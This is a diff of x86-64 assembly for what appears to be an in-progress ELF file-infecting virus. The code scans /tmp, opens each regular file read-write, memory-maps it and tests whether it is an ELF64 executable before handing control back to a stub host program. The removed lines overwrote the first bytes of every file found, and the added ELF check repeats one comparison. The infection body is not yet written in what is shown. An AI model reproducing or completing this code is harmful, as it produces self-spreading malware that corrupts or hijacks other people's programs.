@@ -24,13 +24,15 @@ puts:           call        strlen
                 syscall
                 ret
 
-patsy_host:     lea         rdi, [rel hello]
+host:           lea         rdi, [rel hello]
                 call        puts
 
                 xor         rdi, rdi
                 mov         rax, __NR_exit
                 syscall
 hello           db          "hello world",33,10,0
+                times 128 - $ + strlen db 0x90
+
 
 
 _start:
@@ -58,44 +60,62 @@ scandir:        mov         rdx, BUF_SIZE
                 mov         rax, __NR_getdents64
                 syscall
                 test        rax, rax
-                jle         scandir_done
+                jle         .close
 
                 mov         [rel getdents_size], rax            ; nread from getdents64
                 xor         rdx, rdx
                 mov         [rel getdents_idx], rdx
 
-scandir_file:   mov         rdi, [rel getdents_buf]
+.file:          mov         rdi, [rel getdents_buf]
                 add         rdi, [rel getdents_idx]
 
                 cmp         byte [rdi + 18], DT_REG
-                jne         scandir_next
+                jne         .next
 
                 add         rdi, 19                             ; d_name[]
                 call        infect
 
-scandir_next:   mov         rdi, [rel getdents_buf]
+.next:          mov         rdi, [rel getdents_buf]
                 add         rdi, [rel getdents_idx]
                 movzx       rax, word [rdi + 16]                ; d_reclen
                 add         rax, [rel getdents_idx]
                 mov         [rel getdents_idx], rax
                 mov         rdx, [rel getdents_size]
                 cmp         rax, rdx
-                jl          scandir_file
+                jl          .file
                 jmp         scandir
 
-scandir_done:   mov         rdi, [rel directory_fd]
+.close:         mov         rdi, [rel directory_fd]
                 mov         rax, __NR_close
                 syscall
 return:
                 jmp         [rel entry]
 
+is_valid_elf64:                                                 ; expecing data in rdi
+                xor         rax, rax                            ; result in rax; 1 = valid
+                cmp         qword [rdi + 8], rax
+                jnz         .return
+                mov         rdx, ELF_SYSV
+                cmp         qword [rdi], rdx
+                jz          .continue
+                mov         rdx, ELF_SYSV
+                cmp         qword [rdi], rdx
+                jnz         .return
+.continue:      mov         rdx, ELF64_ET_DYN
+                cmp         qword [rdi + 16], rdx
+                jz          .ok
+                mov         rdx, ELF64_ET_EXEC
+                cmp         qword [rdi + 16], rdx
+                jnz         .return
+.ok:            inc         rax
+.return:        ret
 
 infect:                                                         ; expecting filename in rdi
                 mov         rsi, O_RDWR
                 mov         rax, __NR_open
                 syscall
                 test        rax, rax
-                jl          infect_return
+                jl          .return
 
                 mov         [rel infect_fd], rax
 
@@ -104,7 +124,7 @@ infect:                                                         ; expecting file
                 mov         rax, __NR_fstat
                 syscall
                 cmp         rax, 0
-                jnz         infect_close
+                jnz         .close
 
                 mov         rax, qword [rsp - (256-48)]         ; st_size
                 mov         [rel infect_fsize], rax
@@ -119,20 +139,24 @@ infect:                                                         ; expecting file
                 mov         rax, __NR_mmap
                 syscall
                 cmp         rax, -4095
-                jae         infect_close
+                jae         .close
 
-                mov         rdx, 'alexcito'
-                mov         qword [rax], rdx
-
+                mov         [rel infect_mem], rax
                 mov         rdi, rax
+                call        is_valid_elf64
+                cmp         rax, 1
+                jnz         .unmap
+
+
+.unmap:         mov         rdi, [rel infect_mem]
                 mov         rsi, [rel infect_fsize]
                 mov         rax, __NR_munmap
                 syscall
 
-infect_close:   mov         rdi, [rel infect_fd]
+.close:         mov         rdi, [rel infect_fd]
                 mov         rax, __NR_close
                 syscall
-infect_return:  ret
+.return:        ret
 
 directory_fd    dq          -1
 getdents_buf    dq          -1
@@ -140,9 +164,10 @@ getdents_size   dq          -1
 getdents_idx    dq          -1
 infect_fd       dq          -1
 infect_fsize    dq          -1
+infect_mem      dq          -1
 
 
 
 slash_tmp   db "/tmp",0
-entry       dq patsy_host
+entry       dq host
 _finish     equ $
